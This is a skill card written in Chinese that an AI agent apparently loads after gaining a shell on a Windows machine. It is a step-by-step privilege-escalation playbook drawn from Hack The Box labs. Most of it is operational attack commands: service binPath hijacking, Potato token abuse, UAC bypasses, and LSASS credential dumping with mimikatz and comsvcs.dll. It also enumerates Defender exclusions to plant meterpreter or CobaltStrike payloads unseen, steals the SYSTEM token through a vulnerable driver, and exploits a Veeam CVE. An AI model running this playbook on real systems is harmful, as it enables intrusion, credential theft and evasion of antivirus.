---
name: 'windows-privesc'
description: 'Windows 本地提权检查表：特权令牌→服务→UAC→DLL劫持→凭据→内核CVE→自动化。含 2025-2026 最新 CVE 与 Defender 排除项枚举（找免杀落地点）。🆕 含服务 SD（sc sdshow）提权面、Potato 按 build 选型、CreateProcessAsUser 输出不捕获的落盘纪律。（检索词：mimikatz/SeImpersonate/Potato/winpeas/defender/exclusions/5007/privesc/token/seimpersonate/potato/uac/dll/winpeas/sc sdshow/SERVICE_CHANGE_CONFIG/服务 DACL/PrintSpoofer/GodPotato/CreateProcessAsUser/落盘回读/binPath/'
whenToUse: '拿到 Windows shell 后本地提权：特权令牌→服务→UAC→DLL 劫持→凭据→内核 CVE。'
metadata: { domain: ad-win, tier: T1 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# Windows 本地提权

> 🔴 **不自动加载，拿 Windows shell 后按名加载本卡**：有 `skill` 工具 → `skill("windows-privesc")`；有 `skill_search`/`skill_load` → `skill_load("windows-privesc")`；用户手势 → 首行 `/windows-privesc`。

## 快速索引
> 🔴 2026-09-30 修正：本表原先指向的「§2 服务劫持 / §3 UAC / §4 DLL / §5 凭据 / §6 内核 CVE」**与卡内实际编号不符**
> （实际 §2 是第一秒信息收集、§4 是凭据搜集、§6 是自动化工具）—— 照旧表跳转会到**错误的章节**。
> 下表已按真实编号重写。

| 场景 | 跳转 |
|------|------|
| 刚拿 shell | §0 容器检测 → §2 第一秒信息收集 → §5bis 本机监听复查 → §6 自动化 (winpeas) |
| 有特权令牌 (SeImpersonate等) | §3.1 特权令牌 → 🆕 **§3.1bis Potato 选型（按 OS build 分派）+ 输出不捕获的三个后置坑** |
| 有服务修改权限 / 未加引号路径 | §3 快速提权（服务段） |
| 需要搜密码 / 凭据 | §4 凭据搜集 |
| 装了备份 / RMM / 杀软管理端 | §5bis 第三方服务端软件（Veeam 等） |
| 内核版本已知 | §1 内核 CVE |
| 要落地 .NET 工具 | §5bis in-box csc.exe |
| 服务枚举见第三方/自带 `.sys`（自定义路径 + PDB 路径） | §3.7 BYOVD：内核任意读写 → SYSTEM |

## 0. 容器环境检测（拿 shell 第一毫秒！）

```
[ ] whoami /all | findstr /I "docker\|container"
[ ] dir C:\ | findstr /I "dockerenv"
[ ] sc query docker 2>nul | findstr /I "RUNNING"
[ ] dir /b C:\ProgramData\Docker 2>nul
[ ] systeminfo | findstr /I "Hyper-V"
[ ] netstat -ano | findstr /I "docker"
→ 命中 → 🔴 你在容器内！加载 container-escape skill
```

## 1. 2025-2026 通杀内核提权（优先！）

```
[ ] CVE-2025-62215: Windows Kernel 竞态条件 → SYSTEM（已野外利用，CVSS 7.0）
[ ] CVE-2026-26179: Windows Secure Kernel double-free → VTL1 提权
[ ] CVE-2025-30385: CLFS 驱动 use-after-free → SYSTEM 提权
[ ] CVE-2025-24063: Windows Kernel 堆溢出 → 本地提权
[ ] CVE-2025-29810: AD DS 访问控制不当 → 域提权

🔴 关键词搜 exploit: "CVE-XXXX-XXXXX exploit github"
   searchsploit windows kernel <build_number>
```

## 2. 第一秒信息收集

```
[ ] whoami /all; whoami /priv
[ ] systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix"
[ ] net user; net localgroup; net localgroup Administrators
[ ] netstat -ano | findstr LISTEN
[ ] tasklist /svc; sc query state= all | findstr SERVICE_NAME
[ ] set  (环境变量中的密码/令牌)
```

## 3. 快速提权（5 分钟内）

### 3.1 特权令牌（SeImpersonate / SeAssignPrimaryToken）

```
[ ] whoami /priv | findstr /I "SeImpersonate\|SeAssignPrimaryToken"
    → 有 → 🎯 JuicyPotato / PrintSpoofer / GodPotato / SweetPotato
    → Potato 家族覆盖: CLSID 绑定 (OXID 解析) / 命名管道
    🔴 服务账户的代码执行【不保证】有 SeImpersonate：服务的 RequiredPrivileges
       可以把它摘掉。实测（Mist）：Apache 服务里落地的 webshell，whoami /priv
       【没有】SeImpersonate → 整条 Potato 线是死路，别在上面耗时间，直接换方向。
       ★ 判据就是 whoami /priv：没有就是没有，不要去找"交互式会话"来"补"这个特权。

[ ] whoami /priv | findstr /I "SeBackupPrivilege\|SeRestorePrivilege"
    → 有 → robocopy 读 SAM/SYSTEM → secretsdump
    → 有 → diskshadow + robocopy NTDS.dit
    🔴 该特权在【网络登录】令牌里不可用：
        在 WinRM/SMB 会话里跑 reg.exe save = 用【你自己的网络令牌】→ 必被拒
        ✅ 远程场景正解：impacket-reg 的 backup 子命令 —— 由目标机 Remote Registry
           服务（LocalSystem，它自己的本地会话）代劳 → 见 ad-checklist §8.12
        ★ 注意真正会失败的是落盘那一步：DC 本地路径 ✅ / UNC 路径 ❌ rpc_s_access_denied；
          错误码 0xb7 = 上次其实已成功。完整对照表见 §8.12。

[ ] whoami /priv | findstr /I "SeTakeOwnershipPrivilege"
    → 有 → takeown + icacls 劫持服务/文件

[ ] whoami /priv | findstr /I "SeDebugPrivilege"
    → 有 → 注入 LSASS 进程 → 导出凭据

[ ] whoami /priv | findstr /I "SeLoadDriverPrivilege"
    → 有 → 加载恶意驱动
```

### 3.1bis 🔴🆕 Potato 选型：家族成员**不可互换**，按 OS build 分派（Dante 实测）

```
[ ] 前提取自 §3.1：whoami /priv 同时有 SeImpersonatePrivilege + SeAssignPrimaryTokenPrivilege
    （典型来源：MSSQL 的 `nt service\mssql$…`、IIS APPPOOL、服务账号）
```

| 目标 OS | GodPotato | PrintSpoofer64 | 证据 |
|---|---|---|---|
| **Server 2016 build 14393** | ❌ **必失败** | ✅ **成功** | GodPotato 报 `Failed to impersonate security context token`（DCOM `0x80070776`）；换 PrintSpoofer64 立刻 `CreateProcessAsUser() OK`（spooler 在跑） |
| Server 2019/2022 | ✅ | ✅ | —— |

🔴 **纪律**：Potato 家族失败时**先读错误码再决定换不换工具** ——
- `Failed to impersonate security context token` / DCOM `0x80070776` ⇒ **换工具**（不是换参数、不是重试）；
- PrintSpoofer 依赖 **Spooler 服务** ⇒ 跑之前确认 `sc query spooler` 是 RUNNING。

❌ **已证否 · 别重复**：**GodPotato 在 Server 2016 build 14393 上失败**（`Failed to impersonate
security context token` + DCOM `0x80070776`）。这是**按 build 成立的事实** —— 别在同一 build 上再试它的
各种变体（换 .NET 版本 / 换 CLSID / 调参数都救不回来），该 build 直接上 **PrintSpoofer64**。

#### 🔴🆕 `CreateProcessAsUser` 类提权（PrintSpoofer/甜土豆）的三个后置坑

```
[ ] 🔴 🔴 它的 stdout 【不会被上游捕获】：这类工具用 CreateProcessAsUser 起新进程，
    新进程【不继承父进程的管道】⇒ 你在 xp_cmdshell 输出表 / 反弹 shell 回显里
    只能看到工具自己的"成功"提示，看不到命令输出。
    ⇒ 唯一可靠形态：让 SYSTEM 【把结果写文件】，你再回读。
[ ] 🔴 结果文件写到 `C:\Users\<任意可读目录>\`。
    ❌ 不要写 `C:\Windows\Temp`：SYSTEM 在那里创建的文件，我们的普通/服务账号
       【读不了】（Access is denied）—— 本场为此踩了两次。
[ ] 🔴 SYSTEM 属主的文件/目录，【删除也必须以 SYSTEM 身份】执行（普通/服务账号删不掉）
    ⇒ 收尾时同样借一次提权工具去删，否则现场留垃圾。
[ ] 🔴 `C:\Users\<user>\Desktop\flag.txt` 对普通/服务账号 `dir` 会回
    **"File Not Found"（不是 "Access is denied"）** ⇒ 别据此判定"文件不存在"，
    它只是需要 SYSTEM 才能列/读。
```

### 3.2 服务相关

```
[ ] icacls 检查服务二进制权限:
    accesschk.exe -uwcqv "Authenticated Users" * /accepteula
    accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula
    accesschk.exe -uwcqv "Everyone" * /accepteula

[ ] 🔴🆕 服务【自身的 DACL】而不是二进制文件的 ACL（最容易漏的一面）:
    sc sdshow <服务名>        # 在 SDDL 里找是否给了你（或 Everyone/Authenticated Users）
                              #   SERVICE_CHANGE_CONFIG (0x0002) + SERVICE_START (0x0010)
    → 给了 ⇒ 不必碰任何文件，直接改 binPath 就能以该服务身份（常是 LocalSystem）执行
    # 实测: 某第三方服务（IObit 系）的 SD 把这两项给了普通用户 ⇒ `sc config binPath=` 一次到 SYSTEM
    # ⇒ 优先级：先 `sc sdshow` 看 SD 给不给你改配置，再去找可写二进制/未引用路径

[ ] 可修改服务配置:
    sc qc <服务名>
    sc config <服务名> binPath= "C:\evil.exe"
    sc start <服务名>
    🔴 binPath 里用 `cmd.exe /c …` 时，【只有「外部命令 + 参数」形态可靠】：
        ✅ sc config <svc> binPath= "cmd.exe /c xcopy C:\src C:\dst /Y"
        ❌ `cmd.exe /c mkdir …` / `>` 重定向 / `reg add …`  ← 服务启动时无 shell 语义，**静默失效**
    ⇒ 复杂逻辑一律让服务跑 `powershell -File C:\path\script.ps1`，逻辑写进脚本文件。

[ ] 未引用路径 (Unquoted Service Path):
    wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
    → "C:\Program Files\Sub Dir\service.exe" → 劫持 Sub.exe 或 Dir.exe

[ ] 服务注册表权限:
    Get-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services\<服务名>" | fl

[ ] AlwaysInstallElevated:
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    → 均为 1 → msfvenom -f msi → msiexec /quiet /qn /i payload.msi
```

### 3.3 UAC 绕过

```
[ ] whoami /groups | findstr /I "Medium"
    → Medium Mandatory Level → UAC 绕过有效

[ ] 快速检测:
    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
    → 1 = UAC 启用

[ ] 常用绕过:
    fodhelper.exe (Registry hijack — ms-settings 协议劫持，非 CVE-2020-1388)
    computerdefaults.exe
    eventvwr.exe (Registry hijack)
    msconfig.exe (GUI UAC bypass)
    SilentCleanup
    → GitHub: hfiref0x/UACME  (akagi)
```

### 3.4 DLL 劫持

```
[ ] ProcMon 找缺失 DLL（需管理员，但可先枚举路径）
[ ] 常见缺失 DLL 路径:
    C:\Windows\System32\WindowsPowerShell\v1.0\     (PowerShell)
    程序安装目录中不存在的 DLL
[ ] 可写 PATH 目录 → 放同名 DLL → 程序启动时加载
```

### 3.5 计划任务

```
[ ] schtasks /query /fo LIST /v | findstr /I "Task To Run:"
[ ] 可写脚本/二进制 → 替换或追加恶意代码
[ ] icacls <任务路径>  # 检查权限
```

### 3.6 🆕 安全控制枚举（先找"免杀落地点"）

> 🔴 **别一上来就传 payload** —— 先问"这台机器哪里被排除在 AV 之外"。
> Windows Defender 的**排除路径对低权用户可读**（走事件日志），而排除目录往往还可写。

```
[ ] 查 Defender 排除项（不需要管理员！读 Operational 日志 EventID 5007）
    Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" `
      -FilterXPath "*[System[(EventID=5007)]]" |
      Where-Object { $_.Message -like "*Exclusions\Paths*" } |
      Select-Object TimeCreated, Message | Format-List
    # 输出形如:
    #   New value: HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\xampp\htdocs = 0x0
[ ] 或直接读注册表（权限允许时）
    reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
[ ] 拿到排除目录 → 确认可写 → payload 放进去执行（Defender 不会动它）
[ ] 其他安全控制: Get-MpPreference   # 排除项 / 是否禁用实时保护
```

**为什么值钱**：meterpreter / CobaltStrike 这类大 payload 会被 Defender 秒杀，
但**落在排除目录里就安然无恙**。而排除目录通常正是开发目录 / 上传目录 ——
**常常就是我们已经有写权限的那个目录**（如 `C:\xampp\htdocs`）。
（更完整的 AV/EDR 绕过 → 加载 `edr-evasion`）

### 3.7 🆕 第三方/自带驱动 → BYOVD（内核任意读写 → SYSTEM）

```
[ ] sc query type= driver state= all | findstr /I "RUNNING"      # 找非微软的 .sys
[ ] sc qc <Name>        # BINARY_PATH_NAME 落在 System32\drivers 之外 + 带 PDB 路径 = 自编译/第三方
[ ] 试 CreateFile("\\.\<Device>")：# 自研驱动常常不设 SD ⇒ Users / 服务账户就能开
[ ] 反汇编: IRP_MJ_DEVICE_CONTROL 的 switch → 找 METHOD_NEITHER 且**不 ProbeForRead/Write** 的 IOCTL
[ ] 拿到"任意内核读写"后：NtQuerySystemInformation(11) 取 ntoskrnl base → PsInitialSystemProcess
    → 遍历 ActiveProcessLinks 找 System(pid=4) → 把它的 Token 写进本进程 → SYSTEM
```

- 🔴 **反直觉**：服务账户（`NT AUTHORITY\SERVICE`）常显示 `High Mandatory Level`，但 `whoami /groups`
  里**不在 Administrators**，`C:\Users\<user>\*` 依旧 `Access is denied`
  ⇒ **High IL ≠ 提权完成**，该走内核还得走内核。
- 完整判据/EPROCESS 偏移/坑 → 加载 **`windows-byovd-kernel-rw`**。

## 4. 凭据搜集

```
[ ] 内存凭据（需高权限）:
    # mimikatz 直接读 (🔴 AV 杀!)
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

    # 不落盘 dump → mimikatz 离线读 (更隐蔽)
    # 方法1: procdump (需上传)
    procdump.exe -accepteula -ma lsass.exe lsass.dmp
    # 方法2: 纯系统自带 rundll32 (不落盘!)
    rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full
    # 方法3: task manager → 右键 lsass.exe → Create dump file

    # 离线读取: mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"

[ ] SAM/SYSTEM:
    reg save HKLM\SAM sam.save; reg save HKLM\SYSTEM system.save
    secretsdump.py -sam sam.save -system system.save LOCAL

[ ] 配置文件搜索:
    dir /s /b C:\*.xml C:\*.ini C:\*.txt C:\*.config C:\*.cfg 2>nul | findstr /I "pass cred secret key token"

[ ] PowerShell 历史:
    type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

[ ] 浏览器保存密码:
    LaZagne.exe browsers / Windows Vault / WiFi

[ ] 保存的 RDP 连接:
    cmdkey /list
    → 有保存凭据 → runas /savecred /user:DOMAIN\admin cmd.exe
```

## 5. 进程注入 & Token 操作

```
[ ] 注入到高权限进程:
    Get-Process -IncludeUserName | Where-Object { $_.UserName -like "*SYSTEM*" -or $_.UserName -like "*Administrator*" }
    → 选目标进程 PID → Inject

[ ] Token 窃取:
    有 SeDebugPrivilege → 打开 SYSTEM 进程 → DuplicateTokenEx → CreateProcessWithToken
```

## 5bis. 🔴🔴 本机监听复查 + 第三方服务端软件（JobTwo 的**唯一正解**所在）

> ⚠️ 一手实测（HTB JobTwo, Windows Server 2022, 2026-09-30）。这一节值一整台机器。

### 5bis.1 「从外面 filtered」≠「服务不存在」—— 拿 shell 后必须本机重扫

```cmd
:: 🔴 拿 shell 后的第一件事之一：把外部扫出来 filtered/closed 的端口在本机重看一遍
netstat -ano | findstr LISTENING
:: → 过滤出 0.0.0.0: 或 127.0.0.1: 上与外部扫描结果不一致的端口
```
- **主机防火墙只挡外来的**；服务本身在 loopback / 所有接口上照常监听。
- JobTwo：从 Kali `nmap -sT` 看 **9401/9380/9392 全是 `filtered`** ⇒ 前两轮会话据此把 Veeam 判为"死路"，
  **而那正是唯一正解**（`Veeam.Backup.Service` 在 `0.0.0.0:9401` LISTEN，匿名 net.tcp RPC → SYSTEM）。
- 🔴 **纪律：拿到任意立足点后，把所有"外部不可达"的端口列出来，逐个用本机视角重新评估一次。
  外部扫描结论只对"没有立足点"时有效。**
- 同理，**不需要 `portfwd`**：既然已在靶机上，直接把工具传/编到靶机上、以 `127.0.0.1` 为目标跑，
  比造隧道更稳（也避开隧道上的证书/协议问题）。真要外拉再用 `portfwd add -l <p> -r 127.0.0.1 -p <p>`。

### 5bis.2 装了备份 / RMM / 杀软管理端 = 一堆以 LocalSystem 跑的免认证服务

```cmd
:: 认产品（服务名 + 端口 + rpcdump UUID 三重确认）
sc query type= service state= all | findstr /i "veeam backup acronis rmm kaseya solarwinds defender crowdstrike"
netstat -ano | findstr "0.0.0.0"
```
- 这类产品的**管理通道常年 `clientCredentialType=None`**（设计如此，因为要跨机器部署 agent）
  ⇒ **免认证 → 借服务自身的权限执行**。
- 🔴 典型：**Veeam B&R < 11.0.1.1261 → CVE-2023-27532**，9401 上 `DatabaseAccessor` + `GetDataTable`
  = 用 Veeam 自己的 DB 连接执行任意 SQL → `xp_cmdshell` → `MSSQL$VEEAMSQL2016` 是 **LocalSystem** ⇒ **SYSTEM**。
  详见 `veeam-backup-attacks`。
- 🔴 **同时记住反例**：`netstat` 看到端口 + `rpcdump` 看到产品 UUID ≠ 有洞可打。
  Veeam 有 6 个端口常开却零公开 CVE（6160/11731/6162/6190/6210/10001+）；**只有 9401/9380 是入口**。

### 5bis.3 🆕 in-box `csc.exe` = 免上传 exe 的 .NET 工具落地手段

```cmd
mkdir C:\Windows\Temp\t && cd /d C:\Windows\Temp\t
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /platform:x64 /target:exe /out:Tool.exe ^
  /r:System.dll /r:System.Core.dll /r:System.ServiceModel.dll Tool.cs
```
- Windows 自带编译期（**C# 5**，别用 raw string / file-scoped namespace），`C:\Windows\Temp` 对普通用户可写
  ⇒ **源码进、exe 出**，不经过"上传 exe"这一步（也就绕开了 exe 落地的 AV 面）。
- 对"需要引用目标机上现成 DLL"的场景尤其好用（如 Veeam 的 `Veeam.Backup.*.dll`）：
  先 `copy` 出来当 reference，再编译。
- 🔴 编译报 `CS0117`（成员不存在）**通常意味着"这个版本的接口和上游 PoC 不一样"**，
  不是参数写错 —— 先用反射/枚举把真实的类型成员打出来核对（见 `veeam-backup-attacks` 模式 1）。

### 5bis.4 🔴 否掉一条路之前，先确认"否掉的理由"是不是外部视角

JobTwo 的两次误判都属这一类：
| 曾被否掉的路径 | 当时的理由 | 真相 |
|---|---|---|
| Veeam CVE | "端口 filtered" | **外部视角**；本机 0.0.0.0 LISTEN，直接打穿 |
| SQL sysadmin → xp_cmdshell | "`is_srvrolemember=0`" | 这条**确实死了**（但同一台机器上 Veeam 用它自己的 DB 连接做到了同样的事） |
⇒ **"这条路不通"要和"从哪个视角看不通"一起记进台账**，否则下一个会话会继承一个过期的死刑判决。

## 6. 自动化工具

```
[ ] winPEAS.exe / winPEAS.bat              # 全面枚举
[ ] PowerUp.ps1 (Invoke-AllChecks)         # 快速配置检查
[ ] Seatbelt.exe -group=all                # C# 全量检查
[ ] Watson.exe / Windows-Exploit-Suggester  # 内核 CVE 匹配
[ ] PrivescCheck.ps1                       # 现代 PowerUp 替代
```

## 7. 容器逃逸（如果检测到容器）

```
[ ] whoami /all | findstr /I "docker\|container"
[ ] 特权模式 → 挂载宿主机磁盘 → 写计划任务/SSH key
[ ] GMSA / Group MSAs → 域渗透跳板
```

## 快速优先级

| 优先级 | 项 | 命令 |
|--------|----|------|
| 🔴 0 | 特权令牌 | `whoami /priv` → SeImpersonate/SeBackup/SeDebug |
| 🔴 1 | 服务 | `accesschk` / `sc qc` / 未引用路径 |
| 🔴 2 | AlwaysInstallElevated | `reg query ... /v AlwaysInstallElevated` |
| 🔴 3 | UAC 绕过 | `whoami /groups` → Medium → UACME |
| 🟠 4 | DLL 劫持 | ProcMon / 可写 PATH |
| 🟠 5 | 计划任务 | `schtasks /query` + icacls |
| 🟡 6 | 凭据搜集 | PowerShell 历史 / 配置文件 / 内存 |
| 🟡 7 | 内核 CVE | `systeminfo` → WES/Watson |
| 🔵 8 | 自动化 | winPEAS / PowerUp / Seatbelt |

## 反模式

| ❌ 禁止 | ✅ 正确 |
|--------|--------|
| ❌ 上来就跑 Mimikatz (被 AV 杀) | ✅ 先查特权令牌和配置缺陷 |
| ❌ 忽略 whoami /priv | ✅ SeImpersonate 是最快的提权路径 |
| ❌ 在低权限 shell 中死磕内核 CVE | ✅ 先做完 1-5 阶段 |
| ❌ 上传大文件被 AV 杀 | ✅ 优先用 LOTL 技术和 PowerShell |
| ❌ 忘记检查 AlwaysInstallElevated | ✅ 注册表 2 秒就能查完 |
